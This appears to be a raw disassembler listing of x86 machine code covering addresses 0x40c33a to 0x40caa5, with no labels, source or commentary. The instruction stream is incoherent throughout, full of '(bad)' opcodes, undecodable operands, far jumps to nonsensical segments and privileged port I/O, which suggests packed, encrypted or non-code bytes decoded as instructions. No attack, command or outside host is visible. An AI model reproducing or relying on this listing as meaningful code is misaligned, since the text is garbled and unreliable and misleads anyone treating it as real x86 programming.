  40c33a:	or     BYTE PTR [edi+0x67f6c8a3],dh
  40c340:	dec    edi
  40c341:	pop    ebp
  40c342:	shr    DWORD PTR [esi+0x43],cl
  40c345:	(bad)  
  40c346:	fcmovnu st,st(1)
  40c348:	push   esi
  40c349:	xchg   edi,eax
  40c34a:	cld    
  40c34b:	cmc    
  40c34c:	fdiv   QWORD PTR [eax+0x73ea02e3]
  40c352:	dec    edi
  40c353:	sub    al,0x7e
  40c355:	add    eax,0x2600f903
  40c35a:	push   es
  40c35b:	cmp    BYTE PTR [esi+0x70396d8d],ch
  40c361:	dec    BYTE PTR [edx+0x5a]
  40c364:	(bad)  
  40c365:	jns    0x40c313
  40c367:	(bad)  
  40c369:	inc    edx
  40c36a:	inc    edx
  40c36b:	es pop edx
  40c36d:	test   BYTE PTR [esi+0x4e],cl
  40c370:	and    ch,BYTE PTR [eax-0x77bd48d4]
  40c376:	nop
  40c377:	mov    edx,DWORD PTR [edx+0x2970bb66]
  40c37d:	call   FWORD PTR [edi-0x1f664bc0]
  40c383:	js     0x40c3e6
  40c385:	adc    DWORD PTR [ebx-0x7dbbef5f],ebx
  40c38b:	and    BYTE PTR [eax+0x7765aeef],ch
  40c391:	out    dx,al
  40c392:	or     al,0x48
  40c394:	fisubr WORD PTR [esi+edx*4]
  40c397:	test   BYTE PTR [ebx],ch
  40c399:	call   0xe77f37ce
  40c39e:	fidiv  DWORD PTR [ecx]
  40c3a0:	mov    esp,0xb222f49b
  40c3a5:	clc    
  40c3a6:	retf   0x9989
  40c3a9:	xchg   DWORD PTR [edx+0x8f7f69],esp
  40c3af:	inc    eax
  40c3b0:	mov    cl,BYTE PTR [edi+0x72]
  40c3b3:	dec    edx
  40c3b4:	shr    edi,1
  40c3b6:	xchg   edx,eax
  40c3b7:	and    BYTE PTR ds:0x3f82d775,ch
  40c3bd:	jbe    0x40c367
  40c3bf:	cmc    
  40c3c0:	push   edx
  40c3c1:	call   0x4fa9:0xa443d722
  40c3c8:	dec    ebx
  40c3c9:	pandn  mm7,QWORD PTR [edi+eiz*8-0x3b]
  40c3ce:	jnp    0x40c3fd
  40c3d0:	inc    esp
  40c3d1:	(bad)  
  40c3d2:	fimul  DWORD PTR ds:0xfabea210
  40c3d8:	loope  0x40c3e4
  40c3da:	pop    esp
  40c3db:	cwde   
  40c3dc:	lods   al,BYTE PTR ds:[esi]
  40c3dd:	fidivr WORD PTR [eax-0x4156d147]
  40c3e3:	ja     0x40c407
  40c3e5:	inc    edx
  40c3e6:	push   0x62ba1b01
  40c3eb:	xchg   bl,bh
  40c3ed:	adc    ch,BYTE PTR [eax+edi*8+0x4a]
  40c3f1:	mov    bl,0x1a
  40c3f3:	push   esi
  40c3f4:	inc    edi
  40c3f5:	xchg   DWORD PTR [ecx+0x7c731f86],esi
  40c3fb:	pop    edx
  40c3fc:	clc    
  40c3fd:	and    eax,0xfedf1b1c
  40c402:	jge    0x40c38a
  40c404:	out    0xfe,eax
  40c406:	xchg   ebx,eax
  40c407:	xchg   edi,eax
  40c408:	aam    0x8e
  40c40a:	or     al,0xff
  40c40c:	xlat   BYTE PTR ds:[ebx]
  40c40d:	inc    ebp
  40c40e:	and    BYTE PTR [edi+0x8],ah
  40c411:	les    eax,FWORD PTR [esi]
  40c413:	(bad)  
  40c414:	out    0x69,al
  40c416:	add    DWORD PTR [esi-0x11],ebp
  40c419:	sbb    eax,0x816f1060
  40c41e:	cmp    eax,0x580d34a
  40c423:	fbstp  TBYTE PTR ds:0x5e762a7e
  40c429:	pop    ds
  40c42a:	adc    ebx,DWORD PTR [ecx+0x4f]
  40c42d:	addr16 pop eax
  40c42f:	retf   
  40c430:	or     BYTE PTR [ebx+0x21],bl
  40c433:	(bad)  
  40c434:	fcmove st,st(6)
  40c436:	mov    edx,0x2cd3002
  40c43b:	mov    bl,0x2f
  40c43d:	pop    edi
  40c43e:	mov    DWORD PTR [ebx-0x6a],ecx
  40c441:	aas    
  40c442:	ror    BYTE PTR [edx],0x8a
  40c445:	xchg   ebp,eax
  40c446:	xor    eax,0xb8b5e3f0
  40c44b:	jbe    0x40c476
  40c44d:	shl    BYTE PTR [esi+0x2],0xfd
  40c451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c452:	shl    DWORD PTR [esi+esi*1],cl
  40c455:	add    DWORD PTR [ebp+0x6],eax
  40c458:	add    ah,BYTE PTR [edi]
  40c45a:	unpcklps xmm1,XMMWORD PTR [edx-0x7d]
  40c45e:	(bad)  
  40c45f:	mov    ch,0xd
  40c461:	push   esi
  40c462:	push   edx
  40c463:	dec    ebp
  40c464:	mov    ah,0xd9
  40c466:	arpl   WORD PTR [esi+edi*2-0x7520e8d0],cx
  40c46d:	or     eax,0x73c7eb03
  40c472:	(bad)  
  40c473:	mov    ebx,0xce8b9a71
  40c478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c479:	(bad)  
  40c47b:	mov    ebx,0x4fade1bc
  40c480:	mov    esp,0x95005ca6
  40c485:	sub    DWORD PTR [edx],esi
  40c487:	ds or  eax,0x6717d586
  40c48d:	int    0x1f
  40c48f:	jg     0x40c414
  40c491:	and    eax,0xa95a1e7f
  40c496:	sub    BYTE PTR [eax],dh
  40c498:	retf   
  40c499:	dec    ecx
  40c49a:	xchg   ecx,eax
  40c49b:	arpl   WORD PTR [ebx+0x44],bx
  40c49e:	pop    esp
  40c49f:	mov    ?,WORD PTR [ebp-0x5c]
  40c4a2:	cld    
  40c4a3:	fld    QWORD PTR [ebp-0x504241d0]
  40c4a9:	fiadd  DWORD PTR [edx]
  40c4ab:	lock bnd jge 0x40c4ac
  40c4af:	push   es
  40c4b0:	push   cs
  40c4b1:	int3   
  40c4b2:	out    dx,al
  40c4b3:	mov    WORD PTR [ebp*8+0x70855314],es
  40c4ba:	cmp    BYTE PTR [edi+eiz*1-0x4b],ch
  40c4be:	int    0x80
  40c4c0:	cmp    edx,DWORD PTR [esi+eax*4]
  40c4c3:	mov    WORD PTR ds:0x45d3d781,ds
  40c4c9:	ja     0x40c52d
  40c4cb:	outs   dx,DWORD PTR ds:[esi]
  40c4cc:	xchg   ecx,eax
  40c4cd:	sar    ebp,1
  40c4cf:	adc    DWORD PTR [ebx+0x30],ebp
  40c4d2:	adc    BYTE PTR [ecx+0x5d],cl
  40c4d5:	or     al,0x1e
  40c4d7:	push   0x66
  40c4d9:	sub    esi,esp
  40c4db:	xor    eax,0xf407b512
  40c4e0:	call   0xb79177a7
  40c4e5:	push   eax
  40c4e6:	mov    dh,0xe3
  40c4e8:	jg     0x40c4e1
  40c4ea:	call   0x8f20:0x4d63ba0b
  40c4f1:	lahf   
  40c4f2:	jns    0x40c499
  40c4f4:	dec    ebp
  40c4f5:	dec    edi
  40c4f6:	inc    edi
  40c4f7:	pusha  
  40c4f8:	mov    ch,0xed
  40c4fa:	dec    eax
  40c4fb:	push   esi
  40c4fc:	adc    BYTE PTR [edx+0x6058de61],0xd4
  40c503:	jp     0x40c538
  40c505:	jb     0x40c53e
  40c507:	jle    0x40c50d
  40c509:	(bad)  
  40c50a:	cwde   
  40c50b:	es pop esi
  40c50d:	push   eax
  40c50e:	(bad)  
  40c50f:	aas    
  40c510:	jp     0x40c4c1
  40c512:	push   es
  40c513:	ficomp WORD PTR [ebp+0xd8df740]
  40c519:	and    BYTE PTR [ecx+0x199a9ae4],al
  40c51f:	scas   eax,DWORD PTR es:[edi]
  40c520:	mov    dl,al
  40c522:	mov    eax,ds:0xb8e1603
  40c527:	mov    ecx,0x4b889d02
  40c52c:	jecxz  0x40c4b3
  40c52e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c52f:	je     0x40c517
  40c531:	add    DWORD PTR [esi-0x44],esp
  40c534:	push   edx
  40c535:	inc    ecx
  40c536:	inc    esp
  40c537:	(bad)  
  40c539:	mov    ebx,0xb69a78b0
  40c53e:	inc    edx
  40c53f:	jmp    0x3afb6d78
  40c544:	jne    0x40c533
  40c546:	sbb    DWORD PTR [edi+0x2f],ebx
  40c549:	mov    DWORD PTR [ecx+0x4],eax
  40c54c:	mov    eax,DWORD PTR [ebp-0x20]
  40c54f:	jmp    0x40ca5a
  40c554:	cmp    al,0x3c
  40c556:	ret    0xc2c1
  40c559:	rol    ebx,0xc1
  40c55c:	dec    eax
  40c55d:	pop    ebx
  40c55e:	fwait
  40c55f:	or     DWORD PTR [ecx],ebx
  40c561:	popf   
  40c562:	aaa    
  40c563:	sub    al,0x86
  40c565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c566:	js     0x40c5e0
  40c568:	push   0x7c
  40c56a:	js     0x40c5e4
  40c56c:	adc    edx,DWORD PTR [edx+0x4f]
  40c56f:	fmul   QWORD PTR [ebp+0x43]
  40c572:	es inc esp
  40c574:	ins    DWORD PTR es:[edi],dx
  40c575:	fsincos 
  40c577:	and    BYTE PTR [esi],cl
  40c579:	fcomp  QWORD PTR gs:[esp+ebp*2]
  40c57d:	aas    
  40c57e:	or     BYTE PTR cs:[ecx+0x6],0xeb
  40c583:	dec    eax
  40c584:	jne    0x40c53b
  40c586:	nop
  40c587:	ins    DWORD PTR es:[edi],dx
  40c588:	mov    edx,0x82e48ca6
  40c58d:	lods   eax,DWORD PTR ds:[esi]
  40c58e:	imul   edi,DWORD PTR ds:0xc90fb578,0x5a25c9ec
  40c598:	test   al,0xa4
  40c59a:	dec    ebx
  40c59b:	mov    ecx,0xd4f2480
  40c5a0:	xor    DWORD PTR cs:[ebx-0x17],esi
  40c5a4:	mov    ch,0x70
  40c5a6:	dec    ebp
  40c5a7:	retf   
  40c5a8:	jbe    0x40c535
  40c5aa:	jae    0x40c5b3
  40c5ac:	push   0x1836e7ef
  40c5b1:	test   BYTE PTR [esi],ah
  40c5b3:	and    BYTE PTR [edx+0x63224cf5],dh
  40c5b9:	(bad)  
  40c5ba:	jmp    0x8438cfe8
  40c5bf:	out    0x2e,al
  40c5c1:	mov    ?,WORD PTR [edx+edx*8+0x4c]
  40c5c5:	mov    dh,0x1a
  40c5c7:	mov    eax,ds:0x7a00218a
  40c5cc:	cmp    esi,DWORD PTR [esi]
  40c5ce:	push   0xb82367b2
  40c5d3:	push   edi
  40c5d4:	ret    
  40c5d5:	stos   DWORD PTR es:[edi],eax
  40c5d6:	push   ss
  40c5d7:	or     DWORD PTR ds:0xa04f5ab4,esi
  40c5dd:	in     eax,0x4a
  40c5df:	add    ebx,DWORD PTR [eax-0x4e8ba7d2]
  40c5e5:	ror    BYTE PTR [edx+0x1b],cl
  40c5e8:	in     al,dx
  40c5e9:	cmp    eax,0xcc51ad48
  40c5ee:	es add al,0x28
  40c5f1:	xor    eax,0x20194b01
  40c5f6:	xlat   BYTE PTR ds:[ebx]
  40c5f7:	add    al,0x57
  40c5f9:	ret    
  40c5fa:	cmp    eax,0x6251202e
  40c5ff:	in     al,dx
  40c600:	pop    ds
  40c601:	sub    ebp,edi
  40c603:	imul   esi,ebp,0x35
  40c606:	icebp  
  40c607:	(bad)  
  40c608:	test   al,0x54
  40c60a:	mov    ds:0x3fed907b,eax
  40c60f:	add    bl,bh
  40c611:	inc    esp
  40c612:	cmp    edi,DWORD PTR [edx+0x281c6e74]
  40c618:	dec    esp
  40c619:	jg     0x40c642
  40c61b:	lea    ecx,[edx]
  40c61d:	ins    BYTE PTR es:[edi],dx
  40c61e:	inc    ebx
  40c61f:	push   eax
  40c620:	cmp    cl,BYTE PTR [esi-0x53]
  40c623:	ja     0x40c62c
  40c625:	sahf   
  40c626:	adc    al,BYTE PTR [eax]
  40c628:	std    
  40c629:	bound  eax,QWORD PTR [esi+0x6f]
  40c62c:	ins    BYTE PTR es:[edi],dx
  40c62d:	cmp    al,0xd8
  40c62f:	jb     0x40c63a
  40c631:	adc    eax,0x619959cc
  40c636:	sub    BYTE PTR [eax],bh
  40c638:	arpl   WORD PTR [ebx-0x40ed9e3e],bx
  40c63e:	pop    ds
  40c63f:	es jmp 0x2f37:0x61f699c8
  40c647:	push   0xf4ca1cec
  40c64c:	sbb    bh,BYTE PTR [edx]
  40c64e:	mov    bl,0x79
  40c650:	jmp    0x40c5e3
  40c652:	mov    eax,ds:0xee958c79
  40c657:	mov    dh,0x76
  40c659:	xor    al,0x84
  40c65b:	xchg   ebp,eax
  40c65c:	push   0xffffffc9
  40c65e:	cmp    eax,0x644206ba
  40c663:	sub    bh,bh
  40c665:	(bad)  
  40c666:	xor    ebp,DWORD PTR [esp+eax*1-0x63]
  40c66a:	mov    edi,0x790f034d
  40c66f:	shl    BYTE PTR [esi-0x1e],0x22
  40c673:	pop    edi
  40c674:	fcomip st,st(7)
  40c676:	and    al,0x85
  40c678:	mov    ch,dh
  40c67a:	add    edx,esp
  40c67c:	fldenv [edi+0x45]
  40c67f:	ins    BYTE PTR es:[edi],dx
  40c680:	inc    ebx
  40c681:	arpl   WORD PTR [eax+edx*1],sp
  40c684:	dec    ebx
  40c685:	mov    ds:0xcc9a67fa,eax
  40c68a:	cwde   
  40c68b:	and    ecx,DWORD PTR [esi+0xbb0dd43]
  40c691:	push   es
  40c692:	pop    ds
  40c693:	jne    0x40c656
  40c695:	out    dx,eax
  40c696:	add    ebp,edx
  40c698:	fldcw  WORD PTR [ebp-0x5c]
  40c69b:	inc    esi
  40c69c:	sbb    al,0xc
  40c69e:	ret    
  40c69f:	(bad)  
  40c6a0:	sbb    bh,dl
  40c6a2:	lods   eax,DWORD PTR ds:[esi]
  40c6a3:	jb     0x40c6de
  40c6a5:	stc    
  40c6a6:	adc    ah,0x2a
  40c6a9:	out    0x2c,eax
  40c6ab:	jno    0x40c64d
  40c6ad:	mov    WORD PTR [esi-0x52],?
  40c6b0:	mov    al,al
  40c6b2:	shl    DWORD PTR [edx-0x50],1
  40c6b5:	push   ebp
  40c6b6:	(bad)  
  40c6b7:	jl     0x40c6d4
  40c6b9:	push   es
  40c6ba:	sub    DWORD PTR [eax],eax
  40c6bc:	dec    esi
  40c6bd:	add    esi,DWORD PTR [edx-0x6c5a6017]
  40c6c3:	test   BYTE PTR [edi-0x3d1cfe14],cl
  40c6c9:	pop    ds
  40c6ca:	add    eax,0x6a65ec52
  40c6cf:	cmp    DWORD PTR [eax+0x74],ebx
  40c6d2:	mov    eax,ds:0xa398bd89
  40c6d7:	add    al,0xe9
  40c6d9:	sbb    dl,dh
  40c6db:	ret    0xe273
  40c6de:	jle    0x40c74b
  40c6e0:	add    ecx,edi
  40c6e2:	cdq    
  40c6e3:	push   es
  40c6e4:	into   
  40c6e5:	push   0xffffff8f
  40c6e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6e9:	pop    ebx
  40c6ea:	jl     0x40c750
  40c6ec:	sub    edx,eax
  40c6ee:	pop    ds
  40c6ef:	ja     0x40c6cb
  40c6f1:	jmp    0x8eb09c9d
  40c6f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6f7:	aad    0xe0
  40c6f9:	or     bh,bh
  40c6fb:	pop    ebx
  40c6fc:	repz mov ds:0xecc7547e,al
  40c702:	sub    BYTE PTR [edx-0x439b1243],0x12
  40c709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c70a:	sub    eax,0xb11dcf81
  40c70f:	cwde   
  40c710:	jmp    0x2e:0x7cb35743
  40c717:	xor    esi,DWORD PTR [edx-0x7e]
  40c71a:	imul   edx,edi,0xffffff8e
  40c71d:	inc    ecx
  40c71e:	loope  0x40c786
  40c720:	popf   
  40c721:	imul   esi,DWORD PTR [edi+0x45],0x26
  40c725:	adc    esi,eax
  40c727:	bound  ecx,QWORD PTR [eax-0x482a70e5]
  40c72d:	call   0x5acd8d72
  40c732:	fwait
  40c733:	add    al,0xad
  40c735:	lds    esi,FWORD PTR [edi-0x7237d7d3]
  40c73b:	sbb    al,0x41
  40c73d:	adc    bh,BYTE PTR [ebx-0x7e]
  40c740:	fcmovu st,st(1)
  40c742:	call   0x18b9:0xf8798918
  40c749:	push   edx
  40c74a:	xchg   esp,eax
  40c74b:	jmp    0x40c710
  40c74d:	xor    al,BYTE PTR [eax+0x78ada3c1]
  40c753:	sub    BYTE PTR [ebx+0x4c],ch
  40c756:	lock adc cl,BYTE PTR [edi+edx*8-0x15d07819]
  40c75e:	fbld   TBYTE PTR [ebx]
  40c760:	dec    edi
  40c761:	xor    eax,0xc5227cff
  40c766:	ret    0xf90a
  40c769:	imul   dx,WORD PTR [eax],0xffd2
  40c76d:	popa   
  40c76e:	mov    al,0x8d
  40c770:	imul   edx,DWORD PTR [ebp-0x5e],0xffffffe5
  40c774:	(bad)  
  40c775:	neg    DWORD PTR [ebx+0x4]
  40c778:	or     ch,BYTE PTR [ebx]
  40c77a:	(bad)  
  40c77b:	mov    al,ds:0x503db75
  40c780:	lds    ebx,FWORD PTR [edi]
  40c782:	pusha  
  40c783:	popf   
  40c784:	mov    ch,0xb6
  40c786:	mov    ch,0xf0
  40c788:	push   edi
  40c789:	fisttp WORD PTR [ecx-0x6a8184db]
  40c78f:	or     eax,0x966ed4ca
  40c794:	fs ins DWORD PTR es:[edi],dx
  40c796:	retf   0xa21e
  40c799:	in     al,0xde
  40c79b:	out    dx,al
  40c79c:	or     BYTE PTR [ebx+0x1de24980],ah
  40c7a2:	cwde   
  40c7a3:	pop    ebx
  40c7a4:	outs   dx,DWORD PTR ds:[esi]
  40c7a5:	push   ebx
  40c7a6:	mov    ds:0x79130982,eax
  40c7ab:	nop
  40c7ac:	ret    
  40c7ad:	or     al,0x16
  40c7af:	es and al,0xa7
  40c7b2:	stos   BYTE PTR es:[edi],al
  40c7b3:	and    DWORD PTR [eax+edi*1],esp
  40c7b6:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7b8:	jle    0xcb8302a9
  40c7be:	fs cld 
  40c7c0:	cwde   
  40c7c1:	sbb    DWORD PTR [esi+eiz*1],0xaa051757
  40c7c8:	ss lds edx,FWORD PTR ss:0x984a7832
  40c7d0:	aaa    
  40c7d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7d2:	mov    esi,0xce42c5ee
  40c7d7:	jno    0x40c7fa
  40c7d9:	int    0x18
  40c7db:	pop    edi
  40c7dc:	ja     0x40c764
  40c7de:	outs   dx,DWORD PTR ds:[esi]
  40c7df:	xchg   ecx,eax
  40c7e0:	call   0x87b7:0x1e0da79d
  40c7e7:	mov    DWORD PTR [eax+0x8],ebx
  40c7ea:	mov    dl,0xb3
  40c7ec:	test   eax,0x46a15e35
  40c7f1:	sbb    esp,DWORD PTR [ecx+0x7b]
  40c7f4:	jns    0x40c81b
  40c7f6:	ror    BYTE PTR [ecx],0x7d
  40c7f9:	in     al,0x10
  40c7fb:	jecxz  0x40c829
  40c7fd:	mov    WORD PTR [ecx],fs
  40c7ff:	cmp    cl,BYTE PTR [edi+0x772706e1]
  40c805:	pop    ss
  40c806:	xchg   esp,eax
  40c807:	xchg   esp,eax
  40c808:	bound  esp,QWORD PTR [edi+0x4f9bc80f]
  40c80e:	stc    
  40c80f:	(bad)  
  40c810:	cmp    ebp,DWORD PTR [eax-0x7b]
  40c813:	es ja  0x40c847
  40c816:	jne    0x40c82a
  40c818:	adc    al,0xfa
  40c81a:	xchg   edx,eax
  40c81b:	nop
  40c81c:	jl     0x40c86e
  40c81e:	push   edi
  40c81f:	lahf   
  40c820:	push   cs
  40c821:	out    0xd3,eax
  40c823:	test   al,0x0
  40c825:	mov    al,ds:0x37f1087f
  40c82a:	add    eax,ebp
  40c82c:	iret   
  40c82d:	sub    eax,ecx
  40c82f:	fdiv   QWORD PTR [edi]
  40c831:	call   FWORD PTR [ebx]
  40c833:	push   ss
  40c834:	xchg   esp,eax
  40c835:	push   ecx
  40c836:	test   DWORD PTR [esi],0x47907445
  40c83c:	xchg   ecx,eax
  40c83d:	jmp    0x40c7e5
  40c83f:	test   BYTE PTR [ebp+0x25],ch
  40c842:	ret    0xf02
  40c845:	jle    0x40c83e
  40c847:	jmp    0x8095:0x74988d35
  40c84e:	ficomp WORD PTR [ebx+0x53]
  40c851:	push   esp
  40c852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c853:	sbb    DWORD PTR [ecx+ecx*8+0x77014d70],ebp
  40c85a:	or     eax,0x27715c50
  40c85f:	sar    DWORD PTR ds:0xebbb6a05,1
  40c865:	mov    ds:0xe1efe6a0,eax
  40c86a:	in     eax,0xd0
  40c86c:	push   edx
  40c86d:	je     0x40c84f
  40c86f:	repz pop es
  40c871:	push   0x2d
  40c873:	in     al,0x49
  40c875:	mov    edx,0xfe2ed2cd
  40c87a:	and    DWORD PTR [esi+eiz*2],ebx
  40c87d:	gs out 0x1e,eax
  40c880:	mov    esp,0x7d63413d
  40c885:	addr16 mov al,ds:0x2681
  40c889:	ret    0xbfa5
  40c88c:	(bad)  
  40c88d:	outs   dx,DWORD PTR ds:[esi]
  40c88e:	pushf  
  40c88f:	loop   0x40c834
  40c891:	in     eax,0x3c
  40c893:	adc    eax,0xe5da2f84
  40c898:	jbe    0x40c87f
  40c89a:	inc    ebx
  40c89b:	outs   dx,DWORD PTR ds:[esi]
  40c89c:	pop    es
  40c89d:	pop    ecx
  40c89e:	out    dx,al
  40c89f:	dec    BYTE PTR [ebx-0x54d1078f]
  40c8a5:	daa    
  40c8a6:	jecxz  0x40c908
  40c8a8:	cs test eax,0xf3dd4569
  40c8af:	inc    esp
  40c8b0:	and    DWORD PTR [ecx+0x5d528959],0x415db749
  40c8ba:	cmp    eax,0xe9df39b4
  40c8bf:	inc    ecx
  40c8c0:	push   ebx
  40c8c1:	repz cmp DWORD PTR [esi],eax
  40c8c4:	ss jne 0x40c8bb
  40c8c7:	(bad)  
  40c8c8:	fidiv  DWORD PTR [edx+eax*2]
  40c8cb:	das    
  40c8cc:	out    dx,al
  40c8cd:	test   BYTE PTR [ebp-0x13b441b9],dh
  40c8d3:	sbb    eax,0xeec805fa
  40c8d8:	pushf  
  40c8d9:	push   esi
  40c8da:	addr16 push 0x6e
  40c8dd:	adc    ecx,DWORD PTR [edi+ecx*8]
  40c8e0:	je     0x40c877
  40c8e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8e3:	std    
  40c8e4:	push   ebx
  40c8e5:	loop   0x40c8f3
  40c8e7:	lods   eax,DWORD PTR ds:[esi]
  40c8e8:	retf   0x8b0d
  40c8eb:	push   edx
  40c8ec:	mov    dl,0x16
  40c8ee:	data16 je 0x40c8e7
  40c8f1:	pop    edi
  40c8f2:	ss call 0xb84b:0x36dbd278
  40c8fa:	mov    ah,0x57
  40c8fd:	inc    ecx
  40c8fe:	add    eax,0x132af350
  40c903:	data16 cld 
  40c905:	adc    DWORD PTR [edx-0x570b0a5d],esp
  40c90b:	push   ebp
  40c90c:	(bad)  
  40c90d:	push   edx
  40c90e:	cmp    eax,eax
  40c910:	push   esi
  40c911:	div    ebp
  40c913:	or     BYTE PTR [edi+0x1a],ch
  40c916:	xchg   esp,eax
  40c917:	push   edx
  40c918:	icebp  
  40c919:	iret   
  40c91a:	scas   eax,DWORD PTR es:[edi]
  40c91b:	daa    
  40c91c:	(bad)  
  40c91d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c91e:	cmp    al,0x2b
  40c920:	mov    dh,0x11
  40c922:	or     eax,0x46f59bd7
  40c927:	dec    cl
  40c929:	imul   ebp,DWORD PTR [ecx],0x4b6f6052
  40c92f:	or     DWORD PTR [ecx],ebx
  40c931:	mov    al,ds:0x68e4ef60
  40c936:	dec    edx
  40c937:	push   ds
  40c938:	adc    al,0x87
  40c93a:	jg     0x40c942
  40c93c:	mov    esp,DWORD PTR [ebx+0x591d892]
  40c942:	or     edi,DWORD PTR [ecx+0xa]
  40c945:	cwde   
  40c946:	in     al,dx
  40c947:	xlat   BYTE PTR ds:[ebx]
  40c948:	mov    BYTE PTR [edx+eax*4],al
  40c94b:	xor    al,0x4b
  40c94d:	loope  0x40c9c3
  40c94f:	and    ecx,edx
  40c951:	int    0x11
  40c953:	mov    eax,ds:0xc88850cd
  40c958:	sbb    DWORD PTR [eax-0x78],edx
  40c95b:	jbe    0x40c930
  40c95d:	sbb    al,0x18
  40c95f:	sbb    edx,esi
  40c961:	fidivr DWORD PTR [esi-0xc]
  40c964:	sbb    ebx,DWORD PTR ds:0xf4d7b93d
  40c96a:	cmc    
  40c96b:	sbb    bh,dh
  40c96d:	out    dx,eax
  40c96e:	or     esi,DWORD PTR [ecx-0x7c480970]
  40c974:	add    al,0x14
  40c976:	cmp    al,0x57
  40c978:	jp     0x40c9a1
  40c97a:	mov    WORD PTR [esp+ecx*4+0x4f],ss
  40c97e:	pop    eax
  40c97f:	loope  0x40c9b1
  40c981:	jge    0x40c926
  40c983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c984:	(bad)  
  40c985:	stos   DWORD PTR es:[edi],eax
  40c986:	jecxz  0x40c9fe
  40c988:	jno    0x40c9fe
  40c98a:	es sbb al,0xec
  40c98d:	fcmovnb st,st(1)
  40c98f:	jmp    0x485476d8
  40c994:	or     bl,0xf6
  40c997:	rol    DWORD PTR [ebx-0x1c],1
  40c99a:	cmp    cl,BYTE PTR gs:[edx]
  40c99d:	xchg   DWORD PTR [ebx-0x3d],esi
  40c9a0:	inc    eax
  40c9a1:	mov    ebx,0x8c6861df
  40c9a6:	in     al,0x4f
  40c9a8:	(bad)  
  40c9a9:	shl    DWORD PTR [ebp+0x69916c5d],cl
  40c9af:	shl    DWORD PTR [edx],0x89
  40c9b2:	(bad)  
  40c9b3:	or     eax,0xe9871789
  40c9b8:	jne    0x40c979
  40c9ba:	mul    DWORD PTR [ebp+0x33]
  40c9bd:	fwait
  40c9be:	mov    dh,0xa7
  40c9c0:	mov    eax,0x27c2d1c2
  40c9c5:	pop    eax
  40c9c6:	cmc    
  40c9c7:	lea    ecx,[ebx-0x35]
  40c9ca:	icebp  
  40c9cb:	xor    edi,DWORD PTR [ecx-0x919bf67]
  40c9d1:	pop    esp
  40c9d2:	lahf   
  40c9d3:	pop    es
  40c9d4:	mov    edi,0x241bc51c
  40c9d9:	test   DWORD PTR [ebx+0x5bea0e95],esi
  40c9df:	mov    cl,0x83
  40c9e1:	push   edi
  40c9e2:	fisub  DWORD PTR [ebx+0x4b]
  40c9e5:	add    esi,DWORD PTR [esi+0x6c28784c]
  40c9eb:	pop    ds
  40c9ec:	mov    ch,0x31
  40c9ee:	mov    esi,0xcfa022c8
  40c9f3:	add    DWORD PTR [ecx+0x1e],ecx
  40c9f6:	jbe    0x40c981
  40c9f8:	ins    BYTE PTR es:[edi],dx
  40c9f9:	adc    al,0xac
  40c9fb:	pushf  
  40c9fc:	dec    ebp
  40c9fd:	xor    ch,dl
  40c9ff:	sub    al,0x39
  40ca01:	and    DWORD PTR [esi],eax
  40ca03:	enter  0x2f5,0x4c
  40ca07:	pushf  
  40ca08:	mov    bh,0xfa
  40ca0a:	push   edi
  40ca0b:	dec    ebp
  40ca0c:	dec    ebx
  40ca0d:	stos   DWORD PTR es:[edi],eax
  40ca0e:	jmp    0x40ca51
  40ca10:	dec    edx
  40ca11:	mov    BYTE PTR [ecx+0x60],dl
  40ca14:	sti    
  40ca15:	mov    ebp,0x723b3cb6
  40ca1a:	mov    esi,0xc5935ad3
  40ca1f:	and    DWORD PTR [eax+0x47dadde1],esi
  40ca25:	xchg   edi,eax
  40ca26:	inc    eax
  40ca27:	into   
  40ca28:	mov    bl,0x67
  40ca2a:	inc    edx
  40ca2b:	sar    DWORD PTR [ebx+0x7fbb8f95],1
  40ca31:	stos   DWORD PTR es:[edi],eax
  40ca32:	cld    
  40ca33:	adc    dh,dl
  40ca35:	pusha  
  40ca36:	dec    esi
  40ca37:	xor    eax,0x81107271
  40ca3c:	xchg   ebx,eax
  40ca3d:	or     BYTE PTR [eax+edx*1-0x72],dl
  40ca41:	sahf   
  40ca42:	shl    DWORD PTR [esi-0x6b],1
  40ca45:	call   0xfed:0xb591ad3f
  40ca4c:	pop    ss
  40ca4d:	sub    al,0x41
  40ca4f:	jg     0x40ca9b
  40ca51:	stos   DWORD PTR es:[edi],eax
  40ca52:	xor    dh,bh
  40ca54:	lahf   
  40ca55:	pop    edi
  40ca56:	pop    edi
  40ca57:	mov    WORD PTR [bx+0x4d8b],?
  40ca5c:	clc    
  40ca5d:	mov    DWORD PTR [ecx+0x8],eax
  40ca60:	jmp    0x40cf6b
  40ca65:	int3   
  40ca66:	sar    DWORD PTR [edi+edi*1],1
  40ca69:	ror    ebp,0xd3
  40ca6c:	rcr    DWORD PTR [eax],1
  40ca6e:	xlat   BYTE PTR ds:[ebx]
  40ca6f:	call   0x63b3e847
  40ca74:	loop   0x40ca66
  40ca76:	scas   eax,DWORD PTR es:[edi]
  40ca77:	js     0x40caf1
  40ca79:	push   0x7c
  40ca7b:	js     0x40caf5
  40ca7d:	mov    bh,0x22
  40ca7f:	cmp    DWORD PTR [edi-0x2d],esi
  40ca82:	sahf   
  40ca83:	cmp    al,0x78
  40ca85:	shl    BYTE PTR [eax+0x5a],cl
  40ca88:	in     eax,dx
  40ca89:	jns    0x40ca62
  40ca8b:	sbb    DWORD PTR [ebx+0x32],edi
  40ca8e:	or     al,0x14
  40ca90:	in     al,0x4e
  40ca92:	push   ecx
  40ca93:	int3   
  40ca94:	lea    ecx,ds:0x9095a55f
  40ca9a:	fs ja  0x40cb12
  40ca9d:	imul   edi,edx,0xfffffff0
  40caa0:	xchg   esi,eax
  40caa1:	jle    0x40cb07
  40caa3:	ret    
  40caa4:	hlt    
  40caa5:	mov    bl,0x4f
